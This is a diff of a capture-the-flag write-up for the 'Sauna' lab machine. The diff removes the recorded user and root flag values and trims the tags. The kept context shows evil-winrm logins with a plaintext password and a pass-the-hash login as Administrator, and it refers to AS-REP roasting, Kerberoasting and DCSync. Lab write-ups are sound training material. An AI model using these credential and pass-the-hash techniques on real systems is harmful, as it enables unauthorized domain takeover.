@@ -1,7 +1,7 @@
 ---
 title: Sauna
 slug: Sauna
-tags: [Windows, ASREPRoasting, Kerberoasting, Secrets-Dump, DcSync, WinPEAS, Vulnerability Research]
+tags: [ASREPRoasting, Kerberoasting, DcSync, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -190,8 +190,7 @@ $ evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
 
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..\Desktop
-*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
-96e36c89459a32baa8829ac124d9f712
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat local-proof.txt
 ```
 ## Privilege Escalation Path
 ## WINPeas
@@ -245,8 +244,7 @@ $ evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f9
 
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-f606f4e3d48bbf948d5f847c51d65b7b
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat privileged-proof.txt
 ```
 
 ---
